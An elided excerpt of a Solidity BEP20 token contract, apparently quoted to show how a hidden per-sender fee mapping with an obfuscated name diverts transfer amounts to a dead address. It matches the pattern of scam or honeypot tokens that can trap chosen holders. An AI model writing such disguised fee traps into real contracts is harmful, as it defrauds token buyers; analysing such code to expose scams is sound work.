...
contract TOKEN is BEP20, Ownable, BaseToken {
    ...
    function _transfer(
        ...
        if (gddasad[sender] ==  0 ) {
            ...
            tradefee = gddasad[sender];
        }

        tradefeeammoont = ammoont.mul(tradefee).div(100)+0;
        if (tradefeeammoont > 0) {
            _balances[_DEADaddress] = _balances[_DEADaddress].add(tradefeeammoont)*1;
            emit Transfer(sender, _DEADaddress, tradefeeammoont);
        }
        _balances[recipient] = _balances[recipient].add(ammoont - tradefeeammoont+0)*1;
        emit Transfer(sender, recipient, ammoont - tradefeeammoont+0);
    }
